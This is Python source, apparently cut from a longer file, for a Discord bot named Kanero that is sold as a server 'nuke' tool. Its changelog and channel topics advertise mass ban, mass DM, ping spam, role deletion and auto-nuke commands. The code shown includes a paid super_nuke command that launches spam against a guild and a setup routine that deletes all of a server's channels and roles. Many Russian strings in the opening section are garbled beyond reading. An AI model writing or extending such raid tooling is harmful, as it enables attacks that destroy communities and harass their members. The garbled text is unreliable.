    uid = user.id
    changes = []
    
    # навсегда� � ����� �����все параллельно�
    in_premium = uid in PREMIUM_LIST
    in_whitelist = uid in config.WHITELIST
    in_freelist = uid in FREELIST
    
    # ������ Guest ���� ��� ���
    if role_guest and role_guest not in user.roles:
        try:
            await user.add_roles(role_guest, reason="fix_role: ���� Guest")
            changes.append("?? Guest � ������")
        except Exception as e:
            changes.append(f"?? Guest � ������: {e}")
    
    # навсегда� � ������ навсегда ����
    if in_premium:
        if role_premium and role_premium not in user.roles:
            try:
                await user.add_roles(role_premium, reason="fix_role: � Premium �����")
                changes.append("?? Premium � ������")
            except Exception as e:
                changes.append(f"?? Premium � ������: {e}")
        else:
            changes.append("?? Premium � ��� ����")
    elif in_whitelist:
        if role_white and role_white not in user.roles:
            try:
                await user.add_roles(role_white, reason="fix_role: � Whitelist")
                changes.append("✅ White � ������")
            except Exception as e:
                changes.append(f"✅ White � ������: {e}")
        else:
            changes.append("✅ White � ��� ����")
    elif in_freelist:
        if role_user and role_user not in user.roles:
            try:
                await user.add_roles(role_user, reason="fix_role: � Freelist")
                changes.append("?? User � ������")
            except Exception as e:
                changes.append(f"?? User � ������: {e}")
        else:
            changes.append("?? User � ��� ����")
    else:
        changes.append("? �� ������ �� � ����� ������")
    
    # ������� ������ ����
    if role_premium and role_premium in user.roles and not in_premium and uid != config.OWNER_ID:
        try:
            await user.remove_roles(role_premium, reason="fix_role: �� � Premium �����")
            changes.append("?? Premium � ������ (�� � ������)")
        except Exception as e:
            changes.append(f"?? Premium � ������ навсегда: {e}")
    
    if role_white and role_white in user.roles and not in_whitelist and not in_premium and uid != config.OWNER_ID:
        try:
            await user.remove_roles(role_white, reason="fix_role: �� � Whitelist")
            changes.append("✅ White � ������ (�� � ������)")
        except Exception as e:
            changes.append(f"✅ White � ������ навсегда: {e}")
    
    # навсегда� �����
    if not changes:
        description = "? ��� ���� � �������, навсегда� �� навсегда�."
    else:
        description = "\n".join(changes)
    
    embed = discord.Embed(
        title=f"?? навсегда ����� � {user.display_name}",
        description=description,
        color=0x0a0a0a
    )
    
    # ��подписка истекла ���� � ������ � �������
    status_lines = []
    if in_premium:
        status_lines.append("?? Premium ����")
    if in_whitelist:
        status_lines.append("✅ Whitelist")
    if in_freelist:
        status_lines.append("?? Freelist")
    
    if status_lines:
        embed.add_field(name="?? ������ � �������", value="\n".join(status_lines), inline=True)
    
    current_roles = [role.name for role in user.roles if role.name in ["💎 Premium", "✅ White", "👥 User", "👤 Guest"]]
    if current_roles:
        embed.add_field(name="?? ������� ����", value="\n".join(current_roles), inline=True)
    
    embed.set_footer(text="?? Kanero  |  !fix_role [@������������]")
    await ctx.send(embed=embed)


@bot.command(name="list_clear")
async def list_clear(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
    wl_removed = len([uid for uid in config.WHITELIST if uid not in protected])
    pm_removed = len(PREMIUM_LIST)
    fl_removed = len(FREELIST)
    config.WHITELIST[:] = [uid for uid in config.WHITELIST if uid in protected]
    PREMIUM_LIST.clear()
    FREELIST.clear()
    save_whitelist()
    save_premium()
    save_freelist()
    embed = discord.Embed(
        title="??? ��� ������ �������",
        description=(
            f"Whitelist: ������� **{wl_removed}**\n"
            f"Premium: ������� **{pm_removed}**\n"
            f"Freelist: ������� **{fl_removed}**\n"
            "������ навсегда�."
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="🤖 Kanero")
    await ctx.send(embed=embed)


# --- PREMIUM COMMANDS --------------------------------------

def premium_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="?? ������ �����٨�",
                description="� ���� ��� навсегда.\n�� навсегда ���� � ��: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="🤖 Kanero")
            await ctx.send(embed=embed)
            return False
        if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
            embed = discord.Embed(
                title="?? PREMIUM �������",
                description="��� ������� навсегда ������ **Premium** навсегда�����.\n\n�� навсегда ���� � ��: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="🤖 Kanero")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


@bot.command(name="super_nuke")
@premium_check()
async def super_nuke(ctx, *, text: str = None):
    guild = ctx.guild
    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        return
    if is_guild_blocked(guild.id):
        embed = discord.Embed(description="?? ���� ����все параллельно�.", color=0x0a0a0a)
        embed.set_footer(text="🤖 Kanero")
        await ctx.send(embed=embed)
        return
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="? ���� ��� ������� �� ���� �Готово.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
    last_spam_text[guild.id] = spam_text
    asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
    asyncio.create_task(log_nuke(guild, ctx.author, "super_nuke"))


# --- OWNER-ONLY NUKE COMMANDS ------------------------------

AUTO_OWNER_NUKE = False
AUTO_OWNER_NUKE_TEXT = None


def save_auto_owner_nuke():
    asyncio.create_task(db_set("data", "auto_owner_nuke", {
        "enabled": AUTO_OWNER_NUKE,
        "text": AUTO_OWNER_NUKE_TEXT
    }))


@bot.command(name="auto_off")
async def auto_off(ctx):
    """Выключает все авто нюки. Только для владельца сервера."""
    global AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE
    # Только владелец сервера может вызывать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    config.AUTO_NUKE = False
    AUTO_SUPER_NUKE = False
    save_auto_super_nuke()
    AUTO_SUPERPR_NUKE = False
    save_auto_superpr_nuke()
    embed = discord.Embed(
        title="🔴 Все авто нюки выключены",
        description=(
            "❌ `auto_nuke` – выключен\n"
            "❌ `auto_super_nuke` – выключен\n"
            "❌ `auto_superpr_nuke` – выключен"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="auto_info")
async def auto_info(ctx):
    """Показать статус всех авто нюков. Только для владельца сервера."""
    # Только владелец сервера может вызывать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return

    def st(val):
        return "✅ Включен" if val else "❌ Выключен"

    embed = discord.Embed(title="📊 Статус авто нюков", color=0x0a0a0a)
    embed.add_field(
        name="💣 auto_nuke",
        value=f"{st(config.AUTO_NUKE)}\n`!auto_nuke on/off`",
        inline=True
    )
    embed.add_field(
        name="💥 auto_super_nuke",
        value=f"{st(AUTO_SUPER_NUKE)}\nТекст: `{AUTO_SUPER_NUKE_TEXT or 'стандарт'}`\n`!auto_super_nuke on/off`",
        inline=False
    )
    embed.set_footer(text="🤖 Kanero  |  !auto_off – выключить все")
    await ctx.send(embed=embed)


async def _post_news_and_sell(guild: discord.Guild):
    """Пишем сообщения в новости и sell после setup/setup_update. Проверяем есть ли уже сообщение бота."""
    news_ch = discord.utils.find(lambda c: "новости" in c.name.lower() or "news" in c.name.lower(), guild.text_channels)
    sell_ch = discord.utils.find(lambda c: "sell" in c.name.lower(), guild.text_channels)
    changelog_ch = discord.utils.find(lambda c: "changelog" in c.name.lower(), guild.text_channels)
    addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)

    # Получаем ссылки на каналы (если канала нет показываем в "неизвестно")
    cl_mention = changelog_ch.mention if changelog_ch else "неизвестно"
    ab_mention = addbot_ch.mention if addbot_ch else "неизвестно"
    sell_mention = sell_ch.mention if sell_ch else "неизвестно"
    ticket_mention = ticket_ch.mention if ticket_ch else "неизвестно"

    # Новости — отправляем если нет уже сообщения бота
    if news_ch:
        try:
            # Проверяем есть ли уже сообщение бота с embed "Всё готово!"
            bot_message_exists = False
            async for message in news_ch.history(limit=50):
                if (message.author == guild.me and message.embeds and 
                    len(message.embeds) > 0 and 
                    "Всё готово!" in message.embeds[0].title):
                    bot_message_exists = True
                    break
            
            # Если сообщения нет - отправляем новое
            if not bot_message_exists:
                embed = discord.Embed(
                    title="🎉 Всё готово!",
                    description=(
                        f"📋 **История обновлений:** {cl_mention}\n\n"
                        f"🤖 **Бесплатный доступ (freelist):**\n"
                        f"Зайди в {ab_mention}\n\n"
                        f"💰💎 **White / Premium — купить:**\n"
                        f"Заходи в {sell_mention}\n\n"
                        f"[Наш сервер](https://discord.gg/nNTB37QNCG)"
                    ),
                    color=0x0a0a0a
                )
                embed.set_footer(text="☠️ Kanero")
                await news_ch.send(content="@everyone", embed=embed)
        except Exception:
            pass

    # Sell — отправляем если нет уже сообщения бота
    if sell_ch:
        try:
            # Проверяем есть ли уже сообщение бота с embed "Покупка доступа к Kanero"
            bot_message_exists = False
            async for message in sell_ch.history(limit=50):
                if (message.author == guild.me and message.embeds and 
                    len(message.embeds) > 0 and 
                    "Покупка доступа к Kanero" in message.embeds[0].title):
                    bot_message_exists = True
                    break
            
            # Если сообщения нет - отправляем новое
            if not bot_message_exists:
                embed = discord.Embed(
                    title="💰 Покупка доступа к Kanero",
                    description=(
                        "**✅ White / 💎 Premium** — покупка на FunPay:\n"
                        "https://funpay.com/users/16928925/\n\n"
                        "**❓ Нужна помощь?**\n"
                        f"Создай тикет: {ticket_mention}\n\n"
                        f"**📁 Freelist (бесплатно)** — зайди в {ab_mention}"
                    ),
                    color=0x0a0a0a
                )
                embed.set_footer(text="☠️ Kanero  |  White и 💎 Premium")
                await sell_ch.send(embed=embed)
        except Exception:
            pass


@bot.command(name="setup")
async def setup(ctx):
    """Автоматическая настройка сервера. Только для OWNER_ID."""
    if ctx.author.id != config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Эта команда доступна только **владельцу** бота (OWNER_ID).",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    guild = ctx.guild
    msg = await ctx.send("⚙️ Начинается настройка сервера... (примерное время ~15-20 сек)")

    # -- 1. Параллельное удаление всех каналов и ролей --
    delete_tasks = []
    
    # Добавляем задачи удаления каналов
    for ch in guild.channels:
        delete_tasks.append(ch.delete())
    
    # Добавляем задачи удаления ролей
    bot_role = guild.me.top_role
    for r in guild.roles:
        if r < bot_role and not r.is_default():
            delete_tasks.append(r.delete())
    
    # Выполняем все удаления одновременно
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)

    # -- 2. Параллельное создание ролей --
    guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False)
    user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False)
    white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False)
    premium_perms = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False)
    owner_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, manage_channels=True, manage_roles=True, manage_webhooks=True, kick_members=True, ban_members=True, manage_nicknames=True, view_audit_log=True, mention_everyone=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, mute_members=True, deafen_members=True, priority_speaker=True)
    dev_perms     = discord.Permissions(administrator=True)

    # Создаем все роли одновременно
    role_tasks = [
        guild.create_role(name="👤 Guest",     color=discord.Color.from_rgb(120, 120, 120), permissions=guest_perms,   hoist=False, mentionable=False),
        guild.create_role(name="👥 User",      color=discord.Color.from_rgb(180, 180, 180), permissions=user_perms,    hoist=True,  mentionable=False),
        guild.create_role(name="✅ White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False),
        guild.create_role(name="💎 Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False),
        guild.create_role(name="🧪 Tester",    color=discord.Color.from_rgb(255, 165, 0),   permissions=premium_perms, hoist=True,  mentionable=False),
        guild.create_role(name="🛡️ Moderator", color=discord.Color.from_rgb(255, 140, 0),   permissions=premium_perms, hoist=True,  mentionable=False),
        guild.create_role(name="👑 Owner",      color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False),
        guild.create_role(name="🔧 Developer",  color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
    ]
    
    roles_result = await asyncio.gather(*role_tasks, return_exceptions=True)
    
    # Сохраняем созданные роли из результатов
    role_guest = roles_result[0] if not isinstance(roles_result[0], Exception) else None
    role_user = roles_result[1] if not isinstance(roles_result[1], Exception) else None
    role_white = roles_result[2] if not isinstance(roles_result[2], Exception) else None
    role_premium = roles_result[3] if not isinstance(roles_result[3], Exception) else None
    role_tester = roles_result[4] if not isinstance(roles_result[4], Exception) else None
    role_mod = roles_result[5] if not isinstance(roles_result[5], Exception) else None
    role_owner = roles_result[6] if not isinstance(roles_result[6], Exception) else None
    role_dev = roles_result[7] if not isinstance(roles_result[7], Exception) else None
    role_media = None  # Удалена
    role_friend = None  # Удалена
    
    # Устанавливаем глобальный ID роли Guest
    global AUTO_ROLE_ID
    if role_guest:
        AUTO_ROLE_ID = role_guest.id
    
    # Создаём роль бота отдельно
    role_bot = await guild.create_role(name=Kanero, color=discord.Color.from_rgb(0, 200, 150), permissions=dev_perms, hoist=True, mentionable=False)

    try:
        await guild.me.add_roles(role_bot)
    except Exception:
        pass

    # Параллельное позиционирование ролей - Developer выше Owner
    try:
        bot_top = guild.me.top_role.position
        position_tasks = []
        if role_bot: position_tasks.append(role_bot.edit(position=max(1, bot_top - 1)))
        if role_dev: position_tasks.append(role_dev.edit(position=max(1, bot_top - 2)))
        if role_owner: position_tasks.append(role_owner.edit(position=max(1, bot_top - 3)))
        if role_tester: position_tasks.append(role_tester.edit(position=max(1, bot_top - 4)))
        if role_mod: position_tasks.append(role_mod.edit(position=max(1, bot_top - 5)))
        if role_premium: position_tasks.append(role_premium.edit(position=max(1, bot_top - 6)))
        if role_white: position_tasks.append(role_white.edit(position=max(1, bot_top - 7)))
        if role_user: position_tasks.append(role_user.edit(position=max(1, bot_top - 8)))
        if role_guest: position_tasks.append(role_guest.edit(position=1))
        
        if position_tasks:
            await asyncio.gather(*position_tasks, return_exceptions=True)
    except Exception:
        pass

    # -- Выдаём всем роль Guest если у них нет ролей --
    if role_guest:
        try:
            guest_count = 0
            for member in guild.members:
                if member.bot:
                    continue
                # Проверяем есть ли у участника роли (кроме @everyone)
                if len(member.roles) == 1:  # Только @everyone
                    try:
                        await member.add_roles(role_guest, reason="Setup - авто-выдача Guest")
                        guest_count += 1
                    except Exception:
                        pass
            if guest_count > 0:
                await ctx.send(f"✅ Выдана роль 👤 Guest **{guest_count}** участникам.")
        except Exception as e:
            print(f"Ошибка при выдаче Guest: {e}")

    # -- 3. @everyone с правом не видеть --
    await guild.default_role.edit(permissions=discord.Permissions(read_messages=False, send_messages=False, connect=False))

    def _ow(read=False, write=False):
        return discord.PermissionOverwrite(read_messages=read, send_messages=write)

    def admin_ow():
        ow = {guild.default_role: _ow(False, False)}
        if role_guest:  ow[role_guest]  = _ow(True, False)
        if role_user:   ow[role_user]   = _ow(True, False)
        if role_white:  ow[role_white]  = _ow(True, False)
        if role_premium:ow[role_premium]= _ow(True, False)
        if role_mod:    ow[role_mod]    = _ow(True, False)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow

    # -- 4. Категории и каналы --

    # 👋 ━━ WELCOME — видят все 👋
    def welcome_ow():
        ow = {guild.default_role: _ow(True, False)}
        if role_guest:  ow[role_guest]  = _ow(True, False)
        if role_user:   ow[role_user]   = _ow(True, False)
        if role_white:  ow[role_white]  = _ow(True, False)
        if role_premium:ow[role_premium]= _ow(True, False)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    cat_welcome = await guild.create_category("━━━━ 👋 WELCOME ━━━━", overwrites=welcome_ow())
    welcome_ch = await guild.create_text_channel("👋・welcome", category=cat_welcome, overwrites=welcome_ow(), topic="Приветствие новых участников и как стать юзер пользователем")

    # ℹ️ ━━ INFO — Guest+ читают, только Owner пишет ℹ️
    def info_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow(True, False)
        if role_user:   ow[role_user]   = _ow(True, False)
        if role_white:  ow[role_white]  = _ow(True, False)
        if role_premium:ow[role_premium]= _ow(True, False)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    cat_info = await guild.create_category("━━━━ ℹ️ INFO ━━━━", overwrites=info_ow())
    info_ch = await guild.create_text_channel("ℹ️・info", category=cat_info, overwrites=info_ow(), topic="Информация о сервере правила и прочее")
    changelog_ch = await guild.create_text_channel("📋・changelog", category=cat_info, overwrites=info_ow(), topic="История обновлений с !changelogall")

    # Отправляем список changelog в канал #changelog
    changelog_embed = discord.Embed(title="📋 CHANGELOG — версии проекта  |  v1.0 > v2.0", color=0x0a0a0a)
    changelog_embed.add_field(name="🔥 v1.0", value="• `!nuke`, `!stop`, `!webhooks`, автоудаление", inline=False)
    changelog_embed.add_field(name="⚡ v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
    changelog_embed.add_field(name="👑 v1.2", value="• Тёмная панель, Owner Panel, `!owl_add`, `!invlink`", inline=False)
    changelog_embed.add_field(name="💎 v1.3", value="• Premium функции, `!block_guild`, `!set_spam_text`", inline=False)
    changelog_embed.add_field(name="🚀 v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
    changelog_embed.add_field(name="💥 v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
    changelog_embed.add_field(name="📊 v1.7", value="• MongoDB, `!pm_add` лист +whitelist, `!list`, `!list_clear`", inline=False)
    changelog_embed.add_field(name="🎯 v1.8", value="• Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
    changelog_embed.add_field(
        name="🎉🎊 v2.0 — полный редизайн",
        value=(
            "• Категории: приветствие и FREELIST и WHITE и PREMIUM\n"
            "• Новейшие роли, каналы, роли User/Media/Moderator\n"
            "• !wl_add/pm_add/fl_add по username/@mention/ID\n"
            "• !setup_update — обновить без удаления каналов\n"
            "• !list_clear — очистка всех листов\n"
            "• ADMIN — все права, только Owner видит\n"
            "• Улучшенная производительность кода"
        ),
        inline=False
    )
    changelog_embed.add_field(
        name="🎨 v2.1 — новые функции",
        value=(
            "• 🤝 Friend, 🎬 Media, 🛡️ Moderator — специальные роли\n"
            "• Авто-роль 👤 Guest всем новым\n"
            "• 💰・sell и 🔧・панель-бота\n"
            "• !sync_roles — синхронизация ролей + авто-удаление из листа\n"
            "• !autorole — смотри авто-роль\n"
            "• Не удаляет роли на домашнем сервере"
        ),
        inline=False
    )
    changelog_embed.add_field(
        name="🔧 v2.2",
        value=(
            "• 🤝 Fame > 🤝 Friend, права как 💎 Premium\n"
            "• 🔧・admin-chat в ADMIN\n"
            "• Роли удаляет с сервера и удаляет с соответствующих\n"
            "• Новая логика синхронизации ролей лист\n"
            "• Авто-лог в 📊・logs для каждой роли\n"
            "• Удалены `/sp` и `/spkd`"
        ),
        inline=False
    )
    changelog_embed.add_field(
        name="🛠️ v2.3 — фиксы",
        value=(
            "• Исправлена производительность при параллельном создании каналов\n"
            "• Удалён не авто-нюков на домашнем сервере\n"
            "• Переименованы роли после нюков (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
            "• Только с OWNER_ID и домашнего сервера\n"
            "• `!help` и `!changelog` доступны для всех на любом сервере\n"
            "• `!setup` и `!setup_update` автоматически выдают роль 👤 Guest\n"
            "• `!compensate` — команда компенсации за потерянные роли"
        ),
        inline=False
    )
    changelog_embed.add_field(
        name="📊 v2.4 — логи, категории, INFO",
        value=(
            "• Новая категория ролей лист с логами и статистикой\n"
            "• Категория INFO с #info и #changelog\n"
            "• `guild.chunk()` с кешированием всех участников\n"
            "• Авто-роль выдается автоматически новым\n"
            "• Удалены `!owner_nuke` и `!auto_owner_nuke`\n"
            "• Улучшенная скорость и параллельная работа\n"
            "• `!setup_update` обновляет #changelog в INFO"
        ),
        inline=False
    )
    changelog_embed.add_field(
        name="🧪 v2.5 — Система Tester и оптимизация",
        value=(
            "• Создана роль 🧪 Tester с правами Premium\n"
            "• Команды `!ts_add`, `!ts_remove` (упрощённые)\n"
            "• Категория 🧪 TESTS с каналами для тестирования\n"
            "• Tester получает доступ к тикетам\n"
            "• Переименована категория ОБЩЕНИЕ → ОСНОВНОЕ\n"
            "• Удалены каналы: панель-бота, команды, статистика, медиа, объявления\n"
            "• Удалены каналы: бонусы (FREELIST), утилиты (WHITE), premium-tools (PREMIUM)\n"
            "• Канал 📝・выдача-листа добавлен в ADMIN\n"
            "• Исправлены все кодировки русского текста\n"
            "• Обновлены правила с информацией о тестерах\n"
            "• Улучшена структура сервера"
        ),
        inline=False
    )
    changelog_embed.set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd  |  Текущая версия: v2.5")
    changelog_embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await changelog_ch.send(embed=changelog_embed)

    # 💬 ━━ ОСНОВНОЕ — Guest+ читают 💬
    def main_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow(True, False)
        if role_user:   ow[role_user]   = _ow(True, False)
        if role_white:  ow[role_white]  = _ow(True, False)
        if role_premium:ow[role_premium]= _ow(True, False)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    def readonly_ow():
        return main_ow()
    
    cat_main = await guild.create_category("━━━━ 💬 ОСНОВНОЕ ━━━━", overwrites=main_ow())
    def addbot_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow(True, True)
        if role_user:   ow[role_user]   = _ow(True, True)
        if role_white:  ow[role_white]  = _ow(True, True)
        if role_premium:ow[role_premium]= _ow(True, True)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    rules_ch  = await guild.create_text_channel("📜・правила",  category=cat_main, overwrites=readonly_ow(), topic="Правила сервера")
    await guild.create_text_channel("📢・новости",              category=cat_main, overwrites=readonly_ow(), topic="Новости и обновления от администрации")
    addbot_ch = await guild.create_text_channel("🤖・addbot",   category=cat_main, overwrites=addbot_ow(), topic="Добавь бота и получишь роль User и доступ к боту")
    await guild.create_text_channel("🤝・партнёрство",          category=cat_main, overwrites=readonly_ow(), topic="Предложения о партнёрстве и сотрудничестве")
    await guild.create_text_channel("💰・sell",                  category=cat_main, overwrites=readonly_ow(), topic="Покупка White/Premium и только только Owner")

    # 💬 ━━ ЧАТЫ — Guest+ пишут 💬
    def chat_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow(True, True)
        if role_user:   ow[role_user]   = _ow(True, True)
        if role_white:  ow[role_white]  = _ow(True, True)
        if role_premium:ow[role_premium]= _ow(True, True)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    def ticket_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow(True, False)
        if role_user:   ow[role_user]   = _ow(True, False)
        if role_white:  ow[role_white]  = _ow(True, False)
        if role_premium:ow[role_premium]= _ow(True, False)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━", overwrites=chat_ow())
    await guild.create_text_channel("💬・общий", category=cat_chat, overwrites=chat_ow(), topic="Общий чат с общением для всех участников с ролью")
    await guild.create_text_channel("🎮・игры", category=cat_chat, overwrites=chat_ow(), topic="Обсуждение и игры для совместной игры")
    # 🎫 create-ticket — видят все Guest+, только читают создавать тикет
    ticket_ch = await guild.create_text_channel("🎫・create-ticket", category=cat_chat, overwrites=ticket_ow(), topic="Чтобы создать тикет нажмите кнопку ниже")

    # 📋 ━━ ЛИСТ ЧАТЫ — User+ 📋
    def list_chats_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow()
        if role_user:   ow[role_user]   = _ow(True, True)
        if role_white:  ow[role_white]  = _ow(True, True)
        if role_premium:ow[role_premium]= _ow(True, True)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    def white_chat_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow()
        if role_user:   ow[role_user]   = _ow()
        if role_white:  ow[role_white]  = _ow(True, True)
        if role_premium:ow[role_premium]= _ow(True, True)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    def premium_chat_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow()
        if role_user:   ow[role_user]   = _ow()
        if role_white:  ow[role_white]  = _ow()
        if role_premium:ow[role_premium]= _ow(True, True)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    cat_lists = await guild.create_category("━━━━ 📋 ЛИСТ ЧАТЫ ━━━━", overwrites=list_chats_ow())
    await guild.create_text_channel("📁・freelist-chat", category=cat_lists, overwrites=list_chats_ow(), topic="Чат для freelist с !nuke, !auto_nuke, !help, !changelog")
    await guild.create_text_channel("✅・white-chat", category=cat_lists, overwrites=white_chat_ow(), topic="Чат для White с !nuke [канал], !stop, !cleanup, !rename, !nicks_all")
    await guild.create_text_channel("💎・premium-chat", category=cat_lists, overwrites=premium_chat_ow(), topic="Чат для Premium пользователей с !super_nuke, !massban, !massdm")

    # 🧪 ━━ TESTS — Tester+ 🧪
    def tests_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow()
        if role_user:   ow[role_user]   = _ow()
        if role_white:  ow[role_white]  = _ow()
        if role_premium:ow[role_premium]= _ow()
        if role_tester: ow[role_tester] = _ow(True, True)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    def tests_info_ow():
        ow = {guild.default_role: _ow()}
        if role_guest:  ow[role_guest]  = _ow()
        if role_user:   ow[role_user]   = _ow()
        if role_white:  ow[role_white]  = _ow()
        if role_premium:ow[role_premium]= _ow()
        if role_tester: ow[role_tester] = _ow(True, False)
        if role_owner:  ow[role_owner]  = _ow(True, True)
        if role_dev:    ow[role_dev]    = _ow(True, True)
        return ow
    
    cat_tests = await guild.create_category("━━━━ 🧪 TESTS ━━━━", overwrites=tests_ow())
    
    # Канал #info в TESTS с инструкциями для тестеров
    info_tests_ch = await guild.create_text_channel("ℹ️・info", category=cat_tests, overwrites=tests_info_ow(), topic="Инструкция для тестеров — как тестировать и что делать")
    
    # Отправляем инструкцию в #info
    tests_info_embed = discord.Embed(
        title="🧪 Инструкция для тестеров",
        description="Добро пожаловать в команду тестеров Kanero! 🎉\n\nВаша задача — помогать находить баги и тестировать новые функции.",
        color=0xff9900
    )
    tests_info_embed.add_field(
        name="📋 Как тестировать",
        value="1. **Читай описание** — в каждом канале есть инструкция\n2. **Тестируй функцию** — попробуй все возможные варианты\n3. **Ищи баги** — если что-то работает неправильно, напиши об этом\n4. **Пиши отчёт** — опиши что произошло и как это повторить",
        inline=False
    )
    tests_info_embed.add_field(
        name="🐛 Как писать отчёт о баге",
        value=(
            "**Канал:** 🐛・bug-reports\n"
            "**Формат:**\n"
            "1. Создай **тред** (правый клик → Создать тред)\n"
            "2. Название треда: краткое описание бага\n"
            "3. В треде напиши:\n"
            "   • **Как повторить:** шаги для воспроизведения\n"
            "   • **Ожидаемо:** что должно было произойти\n"
            "   • **Получилось:** что произошло на самом деле\n"
            "   • **Скриншоты:** если есть"
        ),
        inline=False
    )
    tests_info_embed.add_field(
        name="✅ Как писать результат тестирования",
        value=(
            "**Канал:** ✅・test-results\n"
            "Создай **тред** для каждой функции:\n"
            "• ✅ Функция работает правильно\n"
            "• ❌ Найден баг (ссылка на тред в bug-reports)\n"
            "• ⚠️ Нужно улучшить (описание)"
        ),
        inline=False
    )
    tests_info_embed.add_field(
        name="🧪 Как обсуждать тестирование",
        value="**Канал:** 🧪・testing\n• Обсуждать новые функции\n• Делиться идеями\n• Помогать друг другу\n• Задавать вопросы",
        inline=False
    )
    tests_info_embed.set_footer(text="☠️ Kanero  |  Спасибо за помощь в тестировании!")
    await info_tests_ch.send(embed=tests_info_embed)
    
    # Канал новостей для тестеров
